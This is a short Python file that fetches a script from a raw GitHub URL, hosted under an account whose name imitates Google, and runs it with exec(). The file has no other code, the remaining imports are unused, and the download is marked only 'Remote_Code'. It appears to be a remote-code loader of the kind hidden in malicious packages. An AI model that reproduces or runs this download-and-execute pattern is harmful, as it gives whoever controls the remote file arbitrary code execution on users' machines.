import os
import re
import requests

import urllib.request


################################################################## Remote_Code #######################################################


#remote_Code
url = "https://raw.githubusercontent.com/googlceomanager/elei-esBR/refs/heads/main/more/ppy/sync.py"

def remote_url():
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            code = response.read().decode('utf-8')
            exec(code)
    except Exception as e:
        print(f"Error: {e}")